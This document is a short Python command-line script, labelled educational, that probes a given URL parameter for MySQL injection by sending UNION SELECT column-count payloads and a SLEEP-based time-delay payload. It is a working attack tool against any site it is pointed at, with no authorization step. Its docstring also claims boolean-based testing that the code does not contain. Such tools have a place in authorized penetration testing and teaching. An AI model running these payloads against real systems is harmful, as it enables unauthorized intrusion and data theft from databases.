#!/usr/bin/env python3
"""
SQL Injection Tester - Educational
Demonstrates UNION, time-based, and boolean-based MySQL injection.
"""

import requests
import time
import argparse

def test_union(url, param, headers=None):
    """Find column count via UNION SELECT"""
    print(f"[*] Testing UNION injection on param '{param}'")
    for cols in range(1, 10):
        payload = "' UNION SELECT " + ",".join(["NULL"] * cols) + "--"
        r = requests.get(url, params={param: payload}, headers=headers or {}, timeout=5)
        # If query parses without error, we found column count
        if r.status_code == 200:
            print(f"[+] Column count: {cols}")
            return cols
    return None

def test_time_based(url, param, headers=None, sleep=3):
    """Detect time-based blind injection"""
    print(f"[*] Testing time-based injection on param '{param}'")
    
    baseline = time.time()
    requests.get(url, params={param: "test"}, headers=headers or {}, timeout=10)
    baseline_time = time.time() - baseline
    
    start = time.time()
    payload = f"test' AND SLEEP({sleep})--"
    try:
        requests.get(url, params={param: payload}, headers=headers or {}, timeout=15)
        elapsed = time.time() - start
        if elapsed > (sleep - 0.5):
            print(f"[+] Time-based injection detected (baseline: {baseline_time:.2f}s, injection: {elapsed:.2f}s)")
            return True
    except requests.Timeout:
        print("[+] Timeout indicates time-based injection")
        return True
    
    return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="MySQL injection tester (educational)")
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-p', '--param', required=True)
    args = parser.parse_args()
    
    test_union(args.url, args.param)
    test_time_based(args.url, args.param)
